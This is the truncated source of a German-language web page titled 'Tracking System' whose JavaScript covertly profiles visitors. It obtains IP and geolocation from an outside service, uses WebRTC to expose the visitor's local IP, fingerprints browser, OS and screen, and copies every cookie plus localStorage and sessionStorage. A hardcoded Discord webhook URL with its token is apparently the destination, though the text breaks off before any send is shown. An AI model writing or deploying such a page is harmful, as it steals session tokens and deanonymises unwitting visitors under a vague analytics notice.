<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tracking System</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
            text-align: center;
        }
        .info-box {
            background: #e8f4f8;
            border-left: 4px solid #2196F3;
            padding: 15px;
            margin: 20px 0;
            border-radius: 5px;
        }
        button {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin: 5px;
        }
        button:hover {
            background: #45a049;
        }
        input[type="text"], input[type="email"], textarea {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Willkommen auf unserer Tracking-Seite</h1>
        <div class="info-box">
            <p>Diese Seite erfasst technische Informationen für Analysezwecke.</p>
        </div>
        
        <form id="userForm">
            <h3>Kontaktinformationen</h3>
            <input type="text" id="name" placeholder="Ihr Name" required>
            <input type="email" id="email" placeholder="Ihre E-Mail" required>
            <textarea id="message" placeholder="Ihre Nachricht" rows="4"></textarea>
            <button type="submit">Absenden</button>
        </form>
        
        <div>
            <h3>Test-Buttons</h3>
            <button onclick="testClick()">Klick-Test</button>
            <button onclick="testDownload()">Download-Test</button>
            <button onclick="simulateLogin()">Login simulieren</button>
        </div>
        
        <div id="accountSection" class="hidden">
            <h3>Account-Daten</h3>
            <p>Angemeldet als: <span id="userEmail"></span></p>
            <p>User-ID: <span id="userId"></span></p>
            <p>Account-Typ: <span id="accountType"></span></p>
        </div>
    </div>

    <script>
        // Webhook URL
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1467220093426729269/ImYFulsalFSaKA1ytuMVLp09ZfgCzozf3P3OOjfS7DoTkXOSPLbtL_QJIfawr5rwC2gn';
        
        // Tracking Daten
        let trackingData = {
            sessionId: generateSessionId(),
            startTime: new Date().toISOString(),
            clicks: [],
            mouseMovements: [],
            inputs: [],
            downloads: [],
            uploads: [],
            webRTCIP: null
        };

        // Session ID generieren
        function generateSessionId() {
            return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        }

        // IP und Standort abrufen
        async function getIPAndLocation() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    ip: data.ip,
                    city: data.city,
                    country: data.country_name,
                    region: data.region,
                    latitude: data.latitude,
                    longitude: data.longitude,
                    isp: data.org
                };
            } catch (error) {
                console.error('IP/Standort Fehler:', error);
                return {
                    ip: 'Unbekannt',
                    city: 'Unbekannt',
                    country: 'Unbekannt',
                    region: 'Unbekannt',
                    latitude: null,
                    longitude: null,
                    isp: 'Unbekannt'
                };
            }
        }

        // WebRTC echte IP abrufen
        async function getWebRTCIP() {
            return new Promise((resolve) => {
                const rtc = new RTCPeerConnection({iceServers: []});
                rtc.createDataChannel('', {reliable: false});
                rtc.onicecandidate = (event) => {
                    if (event.candidate) {
                        const candidate = event.candidate.candidate;
                        const match = candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
                        if (match) {
                            trackingData.webRTCIP = match[1];
                            resolve(match[1]);
                        }
                    }
                };
                rtc.createOffer()
                    .then(offer => rtc.setLocalDescription(offer))
                    .catch(e => console.error('WebRTC Fehler:', e));
                
                setTimeout(() => resolve(null), 5000);
            });
        }

        // Browser und System Informationen
        function getBrowserInfo() {
            const ua = navigator.userAgent;
            let browserName = 'Unbekannt';
            let browserVersion = 'Unbekannt';
            
            if (ua.indexOf('Chrome') > -1) {
                browserName = 'Chrome';
                browserVersion = ua.match(/Chrome\/(\d+)/)?.[1] || 'Unbekannt';
            } else if (ua.indexOf('Safari') > -1) {
                browserName = 'Safari';
                browserVersion = ua.match(/Version\/(\d+)/)?.[1] || 'Unbekannt';
            } else if (ua.indexOf('Firefox') > -1) {
                browserName = 'Firefox';
                browserVersion = ua.match(/Firefox\/(\d+)/)?.[1] || 'Unbekannt';
            } else if (ua.indexOf('Edge') > -1) {
                browserName = 'Edge';
                browserVersion = ua.match(/Edge\/(\d+)/)?.[1] || 'Unbekannt';
            }
            
            return {
                name: browserName,
                version: browserVersion,
                userAgent: ua,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                online: navigator.onLine
            };
        }

        // Betriebssystem erkennen
        function getOperatingSystem() {
            const ua = navigator.userAgent;
            let os = 'Unbekannt';
            
            if (ua.indexOf('Windows') > -1) os = 'Windows';
            else if (ua.indexOf('Mac') > -1) os = 'macOS';
            else if (ua.indexOf('Linux') > -1) os = 'Linux';
            else if (ua.indexOf('Android') > -1) os = 'Android';
            else if (ua.indexOf('iOS') > -1) os = 'iOS';
            
            return os;
        }

        // Bildschirmauflösung
        function getScreenInfo() {
            return {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                devicePixelRatio: window.devicePixelRatio,
                windowWidth: window.innerWidth,
                windowHeight: window.innerHeight
            };
        }

        // Gerätetyp erkennen
        function getDeviceType() {
            const ua = navigator.userAgent;
            if (/Mobile|Android|iPhone|iPad|iPod/.test(ua)) {
                return /iPad/.test(ua) ? 'Tablet' : 'Handy';
            }
            return 'PC';
        }

        // Zeitzone
        function getTimezone() {
            return {
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                offset: new Date().getTimezoneOffset(),
                timezoneName: new Date().toLocaleTimeString('de-de', {timeZoneName: 'short'}).split(' ')[1]
            };
        }

        // Cookies und Tracking IDs
        function getCookieData() {
            const cookies = {};
            document.cookie.split(';').forEach(cookie => {
                const [name, value] = cookie.trim().split('=');
                if (name && value) cookies[name] = value;
            });
            
            return {
                cookies: cookies,
                localStorage: Object.keys(localStorage).reduce((obj, key) => {
                    obj[key] = localStorage.getItem(key);
                    return obj;
                }, {}),
                sessionStorage: Object.keys(sessionStorage).reduce((obj, key) => {
                    obj[key] = sessionStorage.getItem(key);
                    return obj;
                }, {})
            };
        }

        // Fingerprint generieren
        function generateFingerprint() {
            const
